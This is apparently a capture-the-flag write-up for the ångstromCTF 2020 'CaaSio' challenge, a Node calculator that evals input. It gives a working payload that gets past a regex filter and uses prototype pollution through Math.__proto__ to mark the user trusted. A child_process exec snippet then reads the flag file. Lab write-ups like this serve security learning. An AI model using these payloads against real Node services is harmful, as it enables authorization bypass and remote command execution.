---
title: "ångstromCTF 2020 - CaaSio Writeup"
date: 2020-03-19T8:44:29Z
---

For CaaSio we had access to a calculator. The source is [here](/ctf/angstrom/caasio/index.js).

Later in the execution our query is `eval`'d so obviously we need to run something interesting there.

There are a lot of details involved so I'll start with the basic ones.

```js
if (name.length > 10) {
    console.log("Your name is too long, I can't remember that!");
    return;
}
user.name = name;
if (user.name == "such_a_trusted_user_wow") {
    user.trusted = true;
}
```

The code above stops us from inputing a name bigger than 10 characters,
so no way you'll get your `such_a_trusted_user_wow`.

```js
while (user.queries < 3)
```

This stops us from making more than 3 queries, but we'll only need two!

```js
if (prompt.length > 200) {
    console.log("That's way too long for me!");
    continue;
}
```

To finish the boring stuff, we cannot send a command with more than 200 characters. 
Still, no problem.

Let's get to the interesting stuff.

```js
let reg = /(?:Math(?:(?:\.\w+)|\b))|[()+\-*/&|^%<>=,?:]|(?:\d+\.?\d*(?:e\d+)?)/g
// ......
if (!user.trusted) {
    prompt = (prompt.match(reg) || []).join``;
}
```

Given we are not trusted, queries we send are filtered by `reg`.
Effectively stopping most possible attempts.

```js
Object.freeze(global);
Object.freeze(Math);
```

This stops us from modifying `Math`, however it is only a shallow freeze.
This means that members of `Math` are not frozen, we will be taking advantage of that to get our trusted execution going!

So, starting with the regex, we can write `Math.any_kind_of_text`,
including `Math.__proto__`.
While `__proto__` cannot be reassigned, we can extend it, 
however we cannot write `Math.__proto__.obj`, as `obj` will be cut out.

Entering lambdas!
We can write `()=>` and while this does not make a multi line lambda, it allows us to make one action at a time.
Enabling composition!

We have our ingredients together!
First we need to get trusted.

```js
((Math)=>(Math.trusted=1))(((Math)=>(Math.__proto__))(Math))
```

You may be confused, in normal JS the code above looks like:

```js
function (Math) {
    Math.trusted = 1;
}(
    function (Math) {
        return Math.__proto__;
    }(Math)
);
```

Which in turn looks more like:

```js
function f(x) {
    return x.__proto__
}

function g(x) {
    return x.trusted = 1;
}

g(f(Math));
```

Why does this give us a trusted user?

`Math` inherits from `Object`, see [here](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math), 
which means that when we mutate `Math.__proto__` we are mutating `Object.__proto__`, thus mutating every object, 
hence why `user.trusted` will be set to `1`.

So now we just need to read the file.

```js
const { exec } = require("child_process");

exec("cat /ctf/flag.txt", (error, stdout, stderr) => {
    console.log(`stdout: ${stdout}`);
});
```

Running the code above, minified, will yield the flag.

```
actf{pr0t0typ3s_4re_4_bl3ss1ng_4nd_4_curs3}
```